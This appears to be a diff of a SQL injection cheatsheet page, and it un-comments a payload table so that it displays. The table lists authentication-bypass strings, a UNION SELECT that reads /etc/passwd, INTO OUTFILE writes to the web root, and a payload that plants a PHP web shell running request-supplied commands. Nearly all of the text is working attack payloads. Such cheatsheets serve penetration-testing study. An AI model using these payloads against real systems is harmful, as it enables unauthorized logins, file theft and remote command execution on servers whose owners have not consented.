@@ -55,7 +55,7 @@ category: cheatsheets
 
 | **Payload** | **Description**   |
 | ------------|-------------------|
-<!-- | **Auth Bypass** |
+| **Auth Bypass** |
 | ```admin' or '1'='1``` | Basic Auth Bypass |
 | ```admin')-- -``` | Basic Auth Bypass With comments |
 | [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
@@ -80,4 +80,4 @@ category: cheatsheets
 | **File Injection** |
 | ```cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -``` | Read local file |
 | ```select 'file written successfully!' into outfile '/var/www/html/proof.txt'``` | Write a string to a local file |
-| ```cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -``` | Write a web shell into the base web directory | -->
+| ```cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -``` | Write a web shell into the base web directory |
